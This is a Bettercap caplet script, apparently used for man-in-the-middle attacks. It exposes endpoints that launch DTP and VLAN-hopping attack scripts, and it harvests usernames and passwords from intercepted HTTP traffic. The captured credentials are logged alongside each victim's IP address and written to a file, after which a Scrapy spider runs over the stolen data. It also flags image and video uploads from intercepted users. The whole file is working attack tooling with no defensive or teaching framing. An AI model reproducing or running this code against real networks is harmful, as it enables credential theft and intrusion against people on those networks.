var exec = require('child_process').exec;
var victims = {};

var dtpAttackProcess = null;
var vlanAttackProcess = null;

function logMessage(message) {
    log("\033[32m" + message + "\033[0m");
}

// Function to execute Scrapy after capturing data
function runScrapy() {
    var scrapyCmd = 'scrapy crawl captured_data_spider';  // Replace with your spider's name
    exec(scrapyCmd, function(error, stdout, stderr) {
        if (error) {
            logMessage("Error running Scrapy: " + error);
        } else {
            logMessage("Scrapy Spider executed successfully.");
            logMessage(stdout);  // Log Scrapy output to the Bettercap console
        }
    });
}

function onRequest(req, res) {
    var ip = req.Client.IP;
    var headers = req.Headers.replace(/\r\n$/g, "").split("\r\n");
    var credentials = {};
    var foundImage = false;
    var foundVideo = false;

    // Handle Start Attack Requests
    if (req.Path === "/start_attack") {
        var attackType = req.Query.type;

        if (attackType === "dtp" && !dtpAttackProcess) {
            dtpAttackProcess = exec("python C:/ProgramData/bettercap/caplets/bk-aio/dtp_attack.python", (error, stdout, stderr) => {
                if (error) {
                    logMessage("Error starting DTP attack: " + error);
                    res.Body = "Failed to start DTP attack.";
                } else {
                    logMessage("DTP attack started.");
                    res.Body = "DTP attack started.";
                }
            });
        } else if (attackType === "vlan" && !vlanAttackProcess) {
            vlanAttackProcess = exec("python C:/ProgramData/bettercap/caplets/bk-aio/vlan_hopping.python", (error, stdout, stderr) => {
                if (error) {
                    logMessage("Error starting VLAN hopping attack: " + error);
                    res.Body = "Failed to start VLAN hopping attack.";
                } else {
                    logMessage("VLAN hopping attack started.");
                    res.Body = "VLAN hopping attack started.";
                }
            });
        } else {
            res.Body = "Attack already running.";
        }
        return; // Exit the function after handling the request
    }

    // Handle Stop Attack Requests
    if (req.Path === "/stop_attack") {
        var attackType = req.Query.type;

        if (attackType === "dtp" && dtpAttackProcess) {
            dtpAttackProcess.kill();
            dtpAttackProcess = null;
            logMessage("DTP attack stopped.");
            res.Body = "DTP attack stopped.";
        } else if (attackType === "vlan" && vlanAttackProcess) {
            vlanAttackProcess.kill();
            vlanAttackProcess = null;
            logMessage("VLAN hopping attack stopped.");
            res.Body = "VLAN hopping attack stopped.";
        } else {
            res.Body = "Attack not running.";
        }
        return; // Exit the function after handling the request
    }

    // Look for username and password in the request
    for (var i = 0; i < headers.length; i++) {
        if (headers[i].includes("username=")) {
            credentials.username = headers[i].replace(/.*username=/, "").split('&')[0];
        }
        if (headers[i].includes("password=")) {
            credentials.password = headers[i].replace(/.*password=/, "").split('&')[0];
        }
    }

    // If credentials are found, log them and write to file
    if (credentials.username && credentials.password) {
        logMessage("[+] Credentials Captured - IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password);
        writeFile("/usr/local/share/bettercap/captured_credentials.txt", "IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password + "\n", true);

        // Trigger Scrapy after writing credentials
        runScrapy();
    }

    // Look for file uploads (images, videos)
    if (req.Headers.includes("multipart/form-data")) {
        if (req.Body.includes("image")) {
            foundImage = true;
            logMessage("[*] Image Upload Detected from " + ip);
            // Handle image storage here
        }
        if (req.Body.includes("video")) {
            foundVideo = true;
            logMessage("[*] Video Upload Detected from " + ip);
            // Handle video storage here
        }
    }

    // Optionally modify the response
    if (foundImage || foundVideo) {
        res.Body = "Thank you for uploading!";
    }
}

function onResponse(req, res) {
    logMessage("Response from IP: " + req.Client.IP);
}